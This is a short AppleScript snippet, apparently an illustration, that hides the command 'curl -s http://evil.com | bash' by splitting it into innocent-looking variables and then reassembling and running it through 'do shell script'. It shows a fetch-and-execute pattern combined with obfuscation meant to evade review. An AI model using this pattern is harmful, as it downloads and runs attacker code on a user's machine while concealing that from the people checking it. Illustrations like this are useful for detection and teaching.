-- Break the command into harmless-looking variables
set a to "curl"              -- HTTP tool
set b to " -s "              -- Silent flag
set c to "http://evil.com"   -- Attacker-controlled URL
set d to " | bash"           -- Pipe to shell
-- Reassemble and run
do shell script a & b & c & d
